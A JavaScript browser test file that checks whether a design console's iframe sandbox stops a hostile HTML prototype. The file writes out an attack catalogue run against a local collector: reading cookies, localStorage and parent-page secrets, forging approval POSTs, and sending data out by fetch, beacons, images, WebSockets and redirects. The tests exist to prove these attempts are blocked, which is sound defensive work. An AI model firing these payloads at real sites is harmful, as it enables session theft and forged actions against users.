// owns: R10, R15 · shared — D13 in a real browser. All endpoints are local; no request interception.
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { readdirSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { withRoot, scripted } from "../_harness.mjs";
import { seedProject, seedPrototype, writeHtml } from "../_fixture.mjs";
import { serve } from "../../shared/console/index.mjs";
import { routes, nav } from "../../discovery/console/index.mjs";
import { HTML_FILE } from "../../discovery/record/index.mjs";
import { loadPrd } from "../../discovery/workshop/index.mjs";

const bytes = root => JSON.stringify(readdirSync(root, { recursive: true, withFileTypes: true }).filter(e => e.isFile()).map(e => [join(e.parentPath, e.name).slice(root.length), readFileSync(join(e.parentPath, e.name)).toString("base64")]).sort());
const actions = {
  "parent-document": "result.textContent = parent.document.documentElement.dataset.secret",
  "top-location-read": "result.textContent = top.location.href",
  cookies: "result.textContent = document.cookie",
  localStorage: "result.textContent = localStorage.getItem('secret')",
  sessionStorage: "result.textContent = sessionStorage.getItem('secret')",
  "approval-fetch": "fetch(AGREE, { method: 'POST', body: new URLSearchParams({by:'intruder'}) }).catch(() => {})",
  "approval-form": "const f = document.createElement('form'); f.method='POST'; f.action=AGREE; f.innerHTML='<input name=by value=intruder>'; document.body.append(f); f.submit()",
  "top-console": "top.location = BOARD",
  "top-external": "top.location = OUT",
  "top-link": "", // a real user click on target=_top, not an evaluate() navigation
  "external-fetch": "fetch(OUT).catch(() => {})",
  "external-image": "const i = new Image(); i.src=OUT; document.body.append(i)",
  "external-beacon": "navigator.sendBeacon(OUT, 'probe')",
  "external-websocket": "new WebSocket(OUT.replace('http:', 'ws:'))",
  "external-stylesheet": "const l=document.createElement('link'); l.rel='stylesheet'; l.href=OUT; document.head.append(l)",
  "external-popup": "window.open(OUT)",
  "external-self": "location.href=OUT",
  "external-meta": "const m=document.createElement('meta'); m.httpEquiv='refresh'; m.content='0;url='+OUT; document.head.append(m)",
};
function hostile(name, consoleUrl, collector, auto = false) {
  const out = `${collector}/hit?case=${name}`;
  return `<!doctype html><title>Hostile prototype</title><button id="attack">Attack</button><a id="top-link" target="_top" href="${out}">Leave</a><output id="result"></output><script>
    const OUT=${JSON.stringify(out)}, AGREE=${JSON.stringify(consoleUrl + "/doors/agree")}, BOARD=${JSON.stringify(consoleUrl + "/board")};
    const result=document.querySelector('#result');
    function attack(){ console.log('attempt:${name}'); try { ${actions[name]} } catch(e) { result.textContent='blocked:'+e.name; } }
    document.querySelector('#attack').onclick=attack;
    document.querySelector('#top-link').onclick=()=>console.log('attempt:${name}');
    console.log('prototype-ready'); ${auto ? 'setTimeout(attack, 0);' : ''}
  </script>`;
}
export default async function isolation({ browser }) {
  let passed = 0; const failures = [], hits = [];
  let foreignHtml = "";
  const collector = createServer((req, res) => {
    if (req.url.startsWith('/hit')) hits.push(req.url);
    res.writeHead(200, { "content-type": req.url.startsWith('/hit') ? "text/css" : "text/html", "access-control-allow-origin": "*" });
    res.end(req.url.startsWith('/hit') ? "/* received */" : foreignHtml);
  });
  collector.on('upgrade', (req, socket) => { hits.push(req.url); socket.end('HTTP/1.1 403 Forbidden\r\nConnection: close\r\n\r\n'); });
  await new Promise(resolve => collector.listen(0, '127.0.0.1', resolve));
  const external = `http://127.0.0.1:${collector.address().port}`;
  const test = async (label, fn) => {
    try { await fn(); passed++; console.log(`PASS ${label}`); }
    catch (e) { failures.push(`${label}: ${e.stack ?? e}`); console.log(`FAIL ${label}: ${e.message}`); }
  };
  const scenario = fn => withRoot({}, async tmp => {
    const root = seedProject(tmp); seedPrototype(root);
    const entries = [], q = scripted(), table = routes({ root, _query: q.query }).map(r => r.method === 'POST' && r.path.startsWith('/doors/') ? { ...r, handler: ctx => { entries.push(r.path); return r.handler(ctx); } } : r);
    // The identical bytes can be served without CSP as a positive control, never as production behavior.
    table.push({ method: 'GET', path: '/test/unprotected', handler: () => ({ file: join(root, HTML_FILE) }) });
    const srv = await serve({ routes: table, nav, port: 0 });
    let context;
    try {
      context = await browser.newContext(); context.setDefaultTimeout(2000);
      const page = await context.newPage(), logs = [];
      page.on('console', msg => logs.push(msg.text()));
      await fn({ root, entries, q, srv, context, page, logs });
    } finally { try { if (context) await context.close(); } finally { await srv.close(); } }
  });
  const open = async (page, path) => { assert.equal((await page.goto(path)).status(), 200); };
  try {
    for (const [name] of Object.entries(actions)) await test(name, () => scenario(async ({ root, entries, q, srv, context, page, logs }) => {
      writeHtml(root, hostile(name, srv.url, external)); const before = bytes(root), start = hits.length;
      await open(page, srv.url + '/prototype');
      const frame = page.frameLocator('iframe[src="/prototype/index.html"]');
      await frame.locator('#attack').waitFor(); assert(logs.includes('prototype-ready'));
      await page.evaluate(() => { document.documentElement.dataset.secret='parent-secret'; document.cookie='secret=parent-secret'; localStorage.setItem('secret','parent-secret'); sessionStorage.setItem('secret','parent-secret'); });
      await frame.locator(name === 'top-link' ? '#top-link' : '#attack').click();
      await page.waitForTimeout(250);
      assert(logs.includes(`attempt:${name}`), 'hostile action must actually run');
      if (['parent-document','top-location-read','cookies','localStorage','sessionStorage'].includes(name)) assert.equal(await frame.locator('#result').innerText(), 'blocked:SecurityError');
      assert.equal(page.url(), srv.url + '/prototype'); assert.equal(context.pages().length, 1);
      assert.deepEqual(entries, []); assert.equal(bytes(root), before); assert.equal(q.calls.length, 0);
      assert.deepEqual(hits.slice(start), [], 'collector received an external request');
    }));
    for (const name of Object.keys(actions).filter(n => n.startsWith('external-'))) await test(`unprotected ${name}`, () => scenario(async ({ root, srv, page }) => {
      const start = hits.length; writeHtml(root, hostile(name, srv.url, external));
      await open(page, srv.url + '/test/unprotected'); await page.locator('#attack').click();
      await page.waitForTimeout(250);
      assert(hits.slice(start).some(h => h === `/hit?case=${name}`), 'positive control never reached collector');
    }));
    for (const name of ['external-self','external-meta']) await test(`foreign parent ${name}`, () => scenario(async ({ root, entries, srv, page, logs }) => {
      writeHtml(root, hostile(name, srv.url, external, true)); const before = bytes(root), start = hits.length;
      foreignHtml = `<iframe src="${srv.url}/prototype/index.html"></iframe>`;
      const raw = page.waitForResponse(r => r.url() === srv.url + '/prototype/index.html');
      await open(page, external + '/foreign'); await raw; await page.waitForTimeout(250);
      assert(!logs.includes('prototype-ready'), 'prototype executed under a foreign ancestor');
      assert.equal(await page.locator('iframe').contentFrame().locator('#attack').count(), 0, 'prototype rendered under a foreign ancestor');
      assert.deepEqual(hits.slice(start), []); assert.deepEqual(entries, []); assert.equal(bytes(root), before);
    }));
    await test('mock button, mock form, then trusted board Answer', () => scenario(async ({ root, entries, q, srv, page }) => {
      writeHtml(root, '<button id="mock">Mock button</button><form id="mock-form"><button>Mock form</button></form><output id="button-result"></output><output id="form-result"></output><script>document.querySelector("#mock").onclick=()=>document.querySelector("#button-result").textContent="clicked"; document.querySelector("#mock-form").onsubmit=e=>{e.preventDefault();document.querySelector("#form-result").textContent="submitted"}</script>');
      const before = bytes(root); await open(page, srv.url + '/prototype');
      const frame = page.frameLocator('iframe'); await frame.locator('#mock').click(); await frame.locator('#mock-form button').click();
      assert.equal(await frame.locator('#button-result').innerText(), 'clicked'); assert.equal(await frame.locator('#form-result').innerText(), 'submitted');
      assert.equal(bytes(root), before); assert.deepEqual(entries, []);
      await open(page, srv.url + '/board'); const form = page.locator('form[action="/doors/answer"]');
      await form.locator('[name=oq]').selectOption('OQ-1'); await form.locator('[name=req]').selectOption('REQ-1');
      await form.locator('[name=answer]').fill('Only while the truck is present.'); await form.locator('[name=by]').fill('PM');
      const response = page.waitForResponse(r => r.url() === srv.url + '/doors/answer' && r.request().method() === 'POST');
      await form.locator('button').click(); assert.equal((await response).status(), 303); await page.waitForURL(srv.url + '/board');
      assert.deepEqual(entries, ['/doors/answer']); assert.notEqual(bytes(root), before); assert.equal(q.calls.length, 0);
      assert(loadPrd(root).requirements.find(r => r.id === 'REQ-1').acceptance_criteria.some(a => a.statement === 'Only while the truck is present.'));
    }));
    await test('direct raw address after warming iframe cache is only a pointer', () => scenario(async ({ root, entries, srv, page, logs }) => {
      writeHtml(root, hostile('external-self', srv.url, external)); const start = hits.length, before = bytes(root);
      await open(page, srv.url + '/prototype'); await page.frameLocator('iframe').locator('#attack').waitFor();
      logs.length = 0; await open(page, srv.url + '/prototype/index.html'); await page.waitForTimeout(250);
      assert.equal(await page.locator('a[href="/prototype"]').count(), 1); assert.equal(await page.locator('iframe, #attack').count(), 0);
      assert(!logs.includes('prototype-ready')); assert.deepEqual(hits.slice(start), []); assert.deepEqual(entries, []); assert.equal(bytes(root), before);
    }));
    await test('foreign form to real agreement door is refused before entry', () => scenario(async ({ root, entries, srv, page }) => {
      const before = bytes(root); foreignHtml = `<form method="POST" action="${srv.url}/doors/agree"><input name="by" value="intruder"><button>Agree</button></form>`;
      await open(page, external + '/foreign'); const response = page.waitForResponse(r => r.url() === srv.url + '/doors/agree');
      await page.locator('button').click(); const r = await response;
      assert.equal(r.status(), 403); assert.match(await r.text(), /untrusted-origin/); assert.deepEqual(entries, []); assert.equal(bytes(root), before);
    }));
  } finally { await new Promise(resolve => collector.close(resolve)); }
  console.log(`${passed}/31 passed`);
  assert.equal(passed + failures.length, 31, 'every declared scenario must finish');
  if (failures.length) throw new Error(failures.join('\n\n'));
}
